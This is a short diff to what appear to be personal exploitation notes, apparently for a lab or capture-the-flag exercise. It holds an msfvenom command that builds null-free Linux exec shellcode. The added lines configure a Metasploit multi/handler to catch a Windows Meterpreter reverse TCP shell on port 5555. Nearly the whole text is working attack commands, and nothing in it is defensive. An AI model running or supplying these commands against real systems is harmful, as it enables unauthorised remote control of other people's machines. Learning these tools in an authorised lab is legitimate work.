@@ -5,4 +5,13 @@ Repeat on their machine
 
 env - gdb func
 
-msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python
+msfvenom -p linux/x86/exec CMD="/bin/whoami" -b "\x00" -f python  ### lport = 5555 lhost = lin ops
+
+msfconsole
+
+use multi/handler
+  show options
+  set payload windows/meterpreter/reverse_tcp
+  set lhost 0.0.0.0
+  set lport 5555
+  show options
